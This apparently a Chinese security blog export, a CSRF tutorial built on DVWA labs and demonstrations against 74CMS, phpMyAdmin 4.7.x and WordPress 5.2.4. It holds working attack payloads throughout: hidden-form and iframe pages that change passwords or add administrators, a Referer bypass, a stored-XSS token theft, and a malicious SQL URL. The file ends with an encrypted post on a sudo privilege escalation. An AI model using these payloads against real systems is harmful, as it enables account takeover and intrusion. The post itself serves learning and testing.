<h3 id="low级别"><a href="#low级别" class="headerlink" title="low级别"></a>low级别<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1527386809.77.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1527386943.9.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1527389971.67.png" alt></h3><p>可以看到DVWA关于CSRF漏洞的出发点是GET请求，并且分析源码发现后台并没有任何过滤，直接出发CSRF漏洞</p>
<h4 id="方式一：直接构造链接，诱导用户点击（这种方式明显可以将链接转换为短链接）"><a href="#方式一：直接构造链接，诱导用户点击（这种方式明显可以将链接转换为短链接）" class="headerlink" title="方式一：直接构造链接，诱导用户点击（这种方式明显可以将链接转换为短链接）"></a>方式一：直接构造链接，诱导用户点击（这种方式明显可以将链接转换为短链接）</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://192.168.1.106/vulnerabilities/csrf/?password_new=attack&amp;password_conf=attack&amp;Change=Change#</span><br></pre></td></tr></table></figure>
<h4 id="方式二：构造一个伪装的页面，可信度更高一点-放在这一台用户可以访问且攻击者可控的机器上，生成连接配合前面说的短链接诱导用户访问，如果没有跨域、token那些限制就可以直接触发，否则需要绕过"><a href="#方式二：构造一个伪装的页面，可信度更高一点-放在这一台用户可以访问且攻击者可控的机器上，生成连接配合前面说的短链接诱导用户访问，如果没有跨域、token那些限制就可以直接触发，否则需要绕过" class="headerlink" title="方式二：构造一个伪装的页面，可信度更高一点(放在这一台用户可以访问且攻击者可控的机器上，生成连接配合前面说的短链接诱导用户访问，如果没有跨域、token那些限制就可以直接触发，否则需要绕过)"></a>方式二：构造一个伪装的页面，可信度更高一点(放在这一台用户可以访问且攻击者可控的机器上，生成连接配合前面说的短链接诱导用户访问，如果没有跨域、token那些限制就可以直接触发，否则需要绕过)</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://192.168.1.106/vulnerabilities/csrf/?password_new=attack&amp;password_conf=attack&amp;Change=Change#"</span> <span class="attr">border</span>=<span class="string">"0"</span> <span class="attr">style</span>=<span class="string">"display:none;"</span>/&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>404<span class="tag">&lt;<span class="name">h1</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>file not found.<span class="tag">&lt;<span class="name">h2</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568860685.1.png" alt></p>
<p>当诱导用户点击过后CSRF已经触发，密码已经被修改</p>
<h4 id="方式三：使用burp的CSRF验证功能（自动生成表单的方式提交测试）"><a href="#方式三：使用burp的CSRF验证功能（自动生成表单的方式提交测试）" class="headerlink" title="方式三：使用burp的CSRF验证功能（自动生成表单的方式提交测试）"></a>方式三：使用burp的CSRF验证功能（自动生成表单的方式提交测试）<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568861050.58.png" alt></h4><p>两种方式，在burp代理的情况下直接在浏览器中可以测试，或者可以将生成的POC(自己可以修改)复制下来，通过链接的形式来访问<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568861215.33.png" alt></p>
<p>可以发现密码已经修改</p>
<h3 id="medium级别"><a href="#medium级别" class="headerlink" title="medium级别"></a>medium级别</h3><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568861395.6.png" alt></p>
<p>用之前的POC进行触发发现漏洞无法触发，根据提示查看源码，发现源码对于referer头进行了限制，显示了server_name，这里就是本地的地址</p>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568861469.09.png" alt></p>
<p>所以这里的思路就是必须要在点击构造好的链接，数据包中的referer要包含192.168.1.106，所以，将之前的POC复制下来，然后新建一个HTML，命名为192.168.1.106.html,让模拟攻击者放在可控服务器上，让用户访问(注意，burpsuit的POC注释掉history.pushState函数，否则无法在referer头中添加server_name)</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="comment">/*history.pushState('', '', '/')*/</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://192.168.1.106/vulnerabilities/csrf/"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"password&amp;#95;new"</span> <span class="attr">value</span>=<span class="string">"admin888"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"password&amp;#95;conf"</span> <span class="attr">value</span>=<span class="string">"admin888"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"Change"</span> <span class="attr">value</span>=<span class="string">"Change"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Submit request"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568862110.62.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568862136.12.png" alt></p>
<p>可以看到：referer头限制成功绕过，漏洞触发。</p>
<h3 id="high级别"><a href="#high级别" class="headerlink" title="high级别"></a>high级别</h3><h4 id="方法一：结合存储型xss"><a href="#方法一：结合存储型xss" class="headerlink" title="方法一：结合存储型xss"></a>方法一：结合存储型xss</h4><p>点击修改密码后抓取数据包如下<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568862268.49.png" alt></p>
<p>可以发现在请求中多了user_token,这样就可以使得csrf失效了，查看源码确认判断<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568862497.23.png" alt></p>
<p>怎么绕过呢，思路：在请求前获取到服务端下发的token，然后带入请求劫持用户操作，触发CSRF，将POC构造为一下可以获取user_token。攻击思路是当受害者点击进入这个页面，脚本会通过一个看不见框架偷偷访问修改密码的页面，获取页面中的token，并向服务器发送改密请求，以完成CSRF攻击。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"> </span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">attack</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="built_in">document</span>.getElementsByName(<span class="string">'user_token'</span>)[<span class="number">0</span>].value = <span class="built_in">document</span>.getElementById(<span class="string">"hack"</span>).contentWindow.document.getElementsByName(<span class="string">'user_token'</span>)[<span class="number">0</span>].value;</span><br><span class="line">            <span class="built_in">document</span>.getElementById(<span class="string">"transfer"</span>).submit();</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp"> </span></span><br><span class="line"><span class="regexp">    &lt;iframe src="http:/</span><span class="regexp">/192.168.1.106/</span>vulnerabilities/csrf<span class="string">" id="</span>hack<span class="string">" border="</span><span class="number">0</span><span class="string">" style="</span>display:none;<span class="string">"&gt;&lt;/iframe&gt;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    &lt;body onload="</span>attack()<span class="string">"&gt;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">        &lt;form method="</span>GET<span class="string">" id="</span>transfer<span class="string">" action="</span>http:<span class="comment">//192.168.1.106/vulnerabilities/csrf"&gt;</span></span><br><span class="line"> </span><br><span class="line">            &lt;input type=<span class="string">"hidden"</span> name=<span class="string">"password_new"</span> value=<span class="string">"attack"</span>&gt;</span><br><span class="line"> </span><br><span class="line">            &lt;input type=<span class="string">"hidden"</span> name=<span class="string">"password_conf"</span> value=<span class="string">"attack"</span>&gt;</span><br><span class="line"> </span><br><span class="line">            &lt;input type=<span class="string">"hidden"</span> name=<span class="string">"user_token"</span> value=<span class="string">""</span>&gt;</span><br><span class="line"> </span><br><span class="line">            &lt;input type=<span class="string">"hidden"</span> name=<span class="string">"Change"</span> value=<span class="string">"Change"</span>&gt;</span><br><span class="line"> </span><br><span class="line">        &lt;<span class="regexp">/form&gt;</span></span><br><span class="line"><span class="regexp">    &lt;/</span>body&gt;</span><br><span class="line"> </span><br><span class="line">&lt;<span class="regexp">/html&gt;</span></span><br></pre></td></tr></table></figure>
<p>测试一下：<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568869029.13.png" alt></p>
<p>为什么会出现这种情况：因为现在的浏览器、基本都不会允许跨域的操作，我们的框架iframe访问的地址是<a href="http://192.168.1.106/vulnerabilities/csrf" target="_blank" rel="noopener">http://192.168.1.106/vulnerabilities/csrf</a>，位于服务器192.168.1.106上，而我们的攻击页面位于黑客服务器192.168.1.101上，两者的域名不同，域名B下的所有页面都不被允许主动获取域名A下的页面内容，除非域名A下的页面主动发送信息给域名B的页面，所以我们的攻击脚本是不可能取到改密界面中的user_token。</p>
<p>理想和现实的差距是比较大的，这次直接在目标站点上放上POC测试(不跨域的情况下，当然，既然能上传了，还挖什么CSRF呀，手动滑稽)<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568869404.4.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568869465.77.png" alt></p>
<p>可以看到，在理想情况下，成功获取到user_token,触发CSRF漏洞，将用户密码改为admin888</p>
<p><strong>理想情况测试完后，想想怎么绕过：组合漏洞，通过XSS获取用户的user_token，然后结合CSRF触发</strong></p>
<p>首先在存储型XSS的name处注入代码，触发存储型XSS漏洞，弹出user_token</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;iframe src=<span class="string">"../csrf"</span> onload=alert(frames[<span class="number">0</span>].document.getElementsByName(<span class="string">"user_token"</span>)[<span class="number">0</span>].value)&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568872357.86.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568872377.73.png" alt></p>
<p>可以看到代码已经注入进去了，利用存储型XSS获取user_token,然后在CSRF处修改密码抓包生成POC替换user_token值既可触发CSRF漏洞<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568872555.58.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568872610.87.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568872638.08.png" alt></p>
<p>可以看到漏洞触发，密码被修改。</p>
<h4 id="方法二：结合xss调用外链通过ajax实现CSRF（没实现，后面补上）"><a href="#方法二：结合xss调用外链通过ajax实现CSRF（没实现，后面补上）" class="headerlink" title="方法二：结合xss调用外链通过ajax实现CSRF（没实现，后面补上）"></a>方法二：结合xss调用外链通过ajax实现CSRF（没实现，后面补上）</h4><p>CSRF结合同Security Level的 XSS漏洞，通过ajax实现跨域请求来获取用户的user_token</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">alert(<span class="built_in">document</span>.cookie);</span><br><span class="line"><span class="keyword">var</span> theUrl = <span class="string">'http://192.168.1.106/vulnerabilities/csrf/'</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">window</span>.XMLHttpRequest) &#123;</span><br><span class="line">    xmlhttp = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    xmlhttp = <span class="keyword">new</span> ActiveXObject(<span class="string">"Microsoft.XMLHTTP"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> count = <span class="number">0</span>;</span><br><span class="line">xmlhttp.withCredentials = <span class="literal">true</span>;</span><br><span class="line">xmlhttp.onreadystatechange=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(xmlhttp.readyState ==<span class="number">4</span> &amp;&amp; xmlhttp.status==<span class="number">200</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">var</span> text = xmlhttp.responseText;</span><br><span class="line">        <span class="keyword">var</span> regex = <span class="regexp">/user_token\' value\=\'(.*?)\' \/\&gt;/</span>;</span><br><span class="line">        <span class="keyword">var</span> match = text.match(regex);</span><br><span class="line">        <span class="built_in">console</span>.log(match);</span><br><span class="line">        alert(match[<span class="number">1</span>]);</span><br><span class="line">            <span class="keyword">var</span> token = match[<span class="number">1</span>];</span><br><span class="line">                <span class="keyword">var</span> new_url = <span class="string">'http://192.168.1.106/vulnerabilities/csrf/?user_token='</span>+token+<span class="string">'&amp;password_new=test&amp;password_conf=test&amp;Change=Change'</span>;</span><br><span class="line">                <span class="keyword">if</span>(count==<span class="number">0</span>)&#123;</span><br><span class="line">                    count++;</span><br><span class="line">                    xmlhttp.open(<span class="string">"GET"</span>,new_url,<span class="literal">false</span>);</span><br><span class="line">                    xmlhttp.send();</span><br><span class="line">                &#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">xmlhttp.open(<span class="string">"GET"</span>,theUrl,<span class="literal">false</span>);</span><br><span class="line">xmlhttp.send();</span><br></pre></td></tr></table></figure>
<h3 id="Tips"><a href="#Tips" class="headerlink" title="Tips:"></a>Tips:</h3><blockquote>
<p>在前面dvwa的high等级中，对于csrf的防御点就在于user_token，通过token可以进行身份鉴别，当然，在没有登录的情况下只能通过组合漏洞获取token或者看看有没有token泄露；除此之外，token在登录的情况下(即以及获取到token的情况下)除了身份鉴别之外，还可以防止重放，因为数据包的重放每次都要更新token，所以在以token为重放判定的情况下，怎么不断重新获取token呢，当然不能手动获取，burp上有插件实现了cookie的更新(有些情况是把token加在cookie中的)，但是对于没有在cookie中的token，可以通过CSRF Token Tracker插件实现自动更新，表面意思是只能更新csrf——token，其实都可以。这样在某些场景，比如短信轰炸啥的就可以突破了，还有些服务端有下发sign的情况，这种插件目前没有发现。</p>
</blockquote>
<p>以dvwa中CSRF的high等级为例</p>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568875700.86.png" alt></p>
<p>没有更新token时修改密码重放<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568875765.59.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568876011.68.png" alt></p>
<p>实时更新token测试<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568875932.29.png" alt></p>
<h2 id="CSRF实战——74CMS"><a href="#CSRF实战——74CMS" class="headerlink" title="CSRF实战——74CMS"></a>CSRF实战——74CMS</h2><h3 id="登录74CMS的后台进行添加管理员操作并抓包"><a href="#登录74CMS的后台进行添加管理员操作并抓包" class="headerlink" title="登录74CMS的后台进行添加管理员操作并抓包"></a>登录74CMS的后台进行添加管理员操作并抓包</h3><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568876799.13.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568876817.8.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568876946.98.png" alt></p>
<p>无token且服务端没有验证referer，直接生成POC测试</p>
<h3 id="生成POC，添加管理账户"><a href="#生成POC，添加管理账户" class="headerlink" title="生成POC，添加管理账户"></a>生成POC，添加管理账户</h3><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568877019.83.png" alt></p>
<p>返回后台查看，发现用户已经添加成功<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568877075.24.png" alt></p>
<h3 id="使用添加的账号登录"><a href="#使用添加的账号登录" class="headerlink" title="使用添加的账号登录"></a>使用添加的账号登录</h3><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568877183.91.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568877231.37.png" alt></p>
<h2 id="CSRF实战——phpMyAdmin-4-7-x-XSRF-CSRF"><a href="#CSRF实战——phpMyAdmin-4-7-x-XSRF-CSRF" class="headerlink" title="CSRF实战——phpMyAdmin 4.7.x XSRF/CSRF"></a>CSRF实战——phpMyAdmin 4.7.x XSRF/CSRF</h2><blockquote>
<p>环境半天打不开哦，直接截图了</p>
</blockquote>
<h3 id="登录靶机"><a href="#登录靶机" class="headerlink" title="登录靶机"></a>登录靶机<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568877618.55.png" alt></h3><h3 id="利用SQL语句更新密码，构造POC"><a href="#利用SQL语句更新密码，构造POC" class="headerlink" title="利用SQL语句更新密码，构造POC"></a>利用SQL语句更新密码，构造POC</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SET</span> passsword=<span class="keyword">PASSWORD</span>(<span class="string">'demos'</span>);</span><br><span class="line"> </span><br><span class="line">http://f1496b741e86dce4b2f79f3e839f977d.vsplate.me:19830/pma/sql.php?db=mysql&amp;table=user&amp;sql_query=<span class="keyword">SET</span>%<span class="number">20</span><span class="keyword">password</span></span><br><span class="line">%<span class="number">20</span>=%<span class="number">20</span><span class="keyword">PASSWORD</span>(%<span class="number">27</span>demos%<span class="number">27</span>)</span><br></pre></td></tr></table></figure>
<p>然后即可利用短域名伪装发送，在这种特定场景下，还可以利用SQL语句进行写shell。</p>
<h2 id="CSRF实战——wordpress5-2-4"><a href="#CSRF实战——wordpress5-2-4" class="headerlink" title="CSRF实战——wordpress5.2.4"></a>CSRF实战——wordpress5.2.4</h2><blockquote>
<p>在后台添加账户处存在csrf，可以利用此处漏洞诱导管理员点击添加管理员账户</p>
</blockquote>
<p>没有referer和token、origin验证</p>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571716416.22.png" alt></p>
<p>直接通过burp抓包生产CSRF-POC在浏览器测试</p>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571716515.04.png" alt></p>
<p>结果如下</p>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571716543.41.png" alt></p>
<h2 id="组合拳"><a href="#组合拳" class="headerlink" title="组合拳"></a>组合拳</h2><blockquote>
<p>记录一些学习到的思路</p>
</blockquote>
<ul>
<li><p>CSRF结合XSS形成上下文漏洞，绕过限制</p>
</li>
<li><p>CSRF结合URL跳转绕过限制</p>
</li>
<li><p><a href="https://gh0st.cn/archives/2018-04-28/1" target="_blank" rel="noopener">CSRF结合点击劫持拿下权限</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">这个思路比较有意思，首先有些平台会存在绑定第三方账号的功能，在已经登录的情况下，点击劫持伪造登录，诱导攻击者点击从而登录第三方账号(攻击者自己的账号),登录后iframe直接跳转到绑定的界面，然后劫持用户继续点击绑定，从而使得受害者在平台上绑定的第三方账号是攻击者注册的小号，从而利用这种思路劫持到受害者平台的权限。</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>CSRF的漏洞挖掘方式，在用户可以增删改(大多数情况)查(jsonp跨、flash跨域、cors跨域)，查看数据包中是否又token、目标表单是否又验证码、目标数据包是否验证了referer来源，json数据是否可以自定义callback函数、flash网站根目录下的crossdomain.xml 中的”access-from domain”是否为通配符、cors、websocket是否验证origin来源。</p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.freebuf.com/articles/web/118352.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/118352.html</a></p>
<p><a href="https://xz.aliyun.com/t/6128#toc-16" target="_blank" rel="noopener">https://xz.aliyun.com/t/6128#toc-16</a></p>
<p><a href="https://www.vulnspy.com/?u=pmasa-2017-9" target="_blank" rel="noopener">https://vulnspy.com/?u=pmasa-2017-9</a></p>
<p><a href="https://xz.aliyun.com/t/5871#toc-3" target="_blank" rel="noopener">https://xz.aliyun.com/t/5871#toc-3</a></p>
<p><a href="https://c1h2e1.github.io/#" target="_blank" rel="noopener">https://c1h2e1.github.io/#</a></p>
<p><a href="https://gh0st.cn/archives/2018-03-22/1" target="_blank" rel="noopener">https://gh0st.cn/archives/2018-03-22/1</a></p>
<p><a href="https://gh0st.cn/archives/2019-03-20/1" target="_blank" rel="noopener">https://gh0st.cn/archives/2019-03-20/1</a></p>
<p><a href="https://www.cnblogs.com/chyingp/p/websocket-deep-in.html" target="_blank" rel="noopener">https://www.cnblogs.com/chyingp/p/websocket-deep-in.html</a></p>
<p><a href="https://xz.aliyun.com/t/5143" target="_blank" rel="noopener">JSONP绕过CSRF防护token </a></p>
<p><a href="https://gh0st.cn/archives/2018-08-01/1" target="_blank" rel="noopener">https://gh0st.cn/archives/2018-08-01/1</a></p>
<p><a href="https://gh0st.cn/archives/2018-04-28/1" target="_blank" rel="noopener">https://gh0st.cn/archives/2018-04-28/1</a> </p>
]]></content>
      <categories>
        <category>web前端相关</category>
      </categories>
      <tags>
        <tag>web前端</tag>
        <tag>CSRF</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2019-14287 linux sudo版本小于1.8.28本地root权限提升</title>
    <url>/2019/10/16/CVE-2019-14287-linux-sudo%E7%89%88%E6%9C%AC%E5%B0%8F%E4%BA%8E1-8-28%E6%9C%AC%E5%9C%B0root%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/</url>
    <content><![CDATA[<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
<div id="hbe-security">
  <div class="hbe-input-container">
  <input type="password" class="hbe-form-control" id="pass" placeholder="您好, 这里需要密码." />
    <label for="pass">您好, 这里需要密码.</label>
    <div class="bottom-line"></div>
  </div>
</div>
<div id="decryptionError" style="display: none;">Incorrect Password!</div>
<div id="noContentError" style="display: none;">No content to display!</div>
<div id="encrypt-blog" style="display:none">
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